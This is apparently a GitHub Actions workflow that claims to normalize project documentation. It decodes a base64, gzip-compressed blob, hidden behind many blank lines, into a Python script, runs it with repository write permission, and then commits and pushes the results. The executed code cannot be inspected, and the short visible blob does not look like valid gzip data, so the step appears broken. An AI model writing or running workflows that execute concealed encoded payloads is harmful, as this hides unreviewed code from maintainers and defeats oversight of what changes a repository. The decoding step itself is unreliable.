name: Apply doc normalization
on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/apply-doc-normalization.yml'
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply reviewed replacements
        shell: bash
        run: |
          cat >/tmp/repls.b64 <<'EOF'
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          HDBTL/8aL0tu1cu/+RjT31frrWs4VLd7Of8LHnyaPF5hAAA=
          EOF
          sed -i 's/^          //' /tmp/repls.b64
          base64 -d /tmp/repls.b64 | gzip -d >/tmp/apply.py
          python /tmp/apply.py
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add TODO.md PROJECT-HANDOFF.md docs/README.md docs/world/15-world-runtime-interaction-rules-draft-v1.md docs/product/01-prd-v0.1.md docs/cognition/13-memory-affect-hybrid-architecture-v1.md docs/cognition/18-emergent-cognitive-experience-v2.md
          git diff --cached --check
          git commit -m 'docs: normalize remaining agent-facing docs'
          git push
